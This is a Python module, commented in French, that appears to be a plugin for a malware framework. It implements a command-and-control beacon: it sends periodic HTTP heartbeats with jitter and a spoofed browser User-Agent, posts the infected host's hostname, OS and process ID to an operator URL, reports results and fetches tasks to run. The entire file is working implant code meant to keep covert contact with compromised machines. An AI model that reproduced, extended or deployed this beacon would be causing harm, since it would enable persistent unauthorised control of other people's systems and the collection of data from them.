"""
beacon_kit — Go-Ghost / Go-Beacon-V2 / Void-Agent / Ghost-Link.
Beaconing C2: heartbeat periodique HTTP(S) avec jitter, rapport de resultats,
recuperation de taches. Multi-plateforme, stdlib uniquement.
Actions: beacon, heartbeat, report, tasks, stop
"""
NAME = "beacon_kit"
VERSION = "1.0.0"
DESCRIPTION = "Beacon C2 avec jitter, heartbeat et recuperation de taches (Go-Ghost, Go-Beacon-V2, Void-Agent)."
AUTHOR = "lucy"
DEPENDENCIES = []
OS_COMPAT = ["windows", "linux", "darwin"]

import json
import platform
import random
import socket
import threading
import time
import urllib.request

_STATE = {"stop": False, "last_beacon": 0, "beacons": 0, "last_result": None}
_LOCK = threading.Lock()


def _result(data=None, error=None, status="completed"):
    return {"status": status, "data": data, "error": error}


def _http(method, url, body=None, timeout=15, headers=None):
    req = urllib.request.Request(url, data=body, method=method)
    req.add_header("User-Agent", headers.get("ua", "Mozilla/5.0") if headers else "Mozilla/5.0")
    if headers:
        for k, v in headers.items():
            if k.lower() != "ua":
                req.add_header(k, v)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read().decode("utf-8", "replace")


def run(action, params):
    try:
        if action == "beacon":
            return _beacon(params)
        if action == "heartbeat":
            return _heartbeat(params)
        if action == "report":
            return _report(params)
        if action == "tasks":
            return _tasks(params)
        if action == "stop":
            with _LOCK:
                _STATE["stop"] = True
            return _result(data={"stopped": True})
        if action == "status":
            with _LOCK:
                return _result(data=dict(_STATE))
        return _result(error="Unknown action: " + str(action), status="failed")
    except Exception as exc:
        return _result(error="beacon_kit: " + str(exc), status="failed")


def _interval(params):
    base = float(params.get("interval", 60))
    jitter_pct = float(params.get("jitter", 20))
    low = base * (1 - jitter_pct / 100.0)
    high = base * (1 + jitter_pct / 100.0)
    return random.uniform(low, high)


def _agent_id(params):
    mid = params.get("agent_id") or params.get("id") or ""
    if mid:
        return mid
    return socket.gethostname() + "-" + platform.node()


def _url(params, suffix):
    base = params.get("url", "").rstrip("/")
    sep = "&" if "?" in base else "?"
    return base + sep + suffix


def _payload(params, extra=None):
    data = {"agent": _agent_id(params),
            "hostname": socket.gethostname(),
            "os": platform.platform(),
            "pid": __import__("os").getpid(),
            "ts": time.time()}
    if extra:
        data.update(extra)
    return json.dumps(data).encode()


def _beacon(params):
    runs = int(params.get("runs", 0))
    url = params.get("url", "")
    if not url:
        return _result(error="No url", status="failed")
    count = 0
    while True:
        if _STATE["stop"]:
            break
        try:
            resp = _http("POST", url, _payload(params), headers=params.get("headers"))
        except Exception as exc:
            resp = "ERR:" + str(exc)
        with _LOCK:
            _STATE["last_beacon"] = time.time()
            _STATE["beacons"] += 1
            _STATE["last_result"] = resp
        count += 1
        if runs and count >= runs:
            break
        time.sleep(_interval(params))
    with _LOCK:
        n = _STATE["beacons"]
    return _result(data={"beacons_sent": n, "last": _STATE["last_result"]})


def _heartbeat(params):
    url = params.get("url", "")
    if not url:
        return _result(error="No url", status="failed")
    resp = _http("POST", url, _payload(params, {"type": "heartbeat"}),
                 headers=params.get("headers"))
    return _result(data={"heartbeat": resp})


def _report(params):
    url = params.get("url", "")
    result = params.get("result", {})
    if not url:
        return _result(error="No url", status="failed")
    resp = _http("POST", url, _payload(params, {"type": "result", "result": result}),
                 headers=params.get("headers"))
    return _result(data={"ack": resp})


def _tasks(params):
    url = params.get("url", "")
    if not url:
        return _result(error="No url", status="failed")
    resp = _http("GET", url, headers=params.get("headers"))
    try:
        return _result(data={"tasks": json.loads(resp)})
    except Exception:
        return _result(data={"tasks_raw": resp})
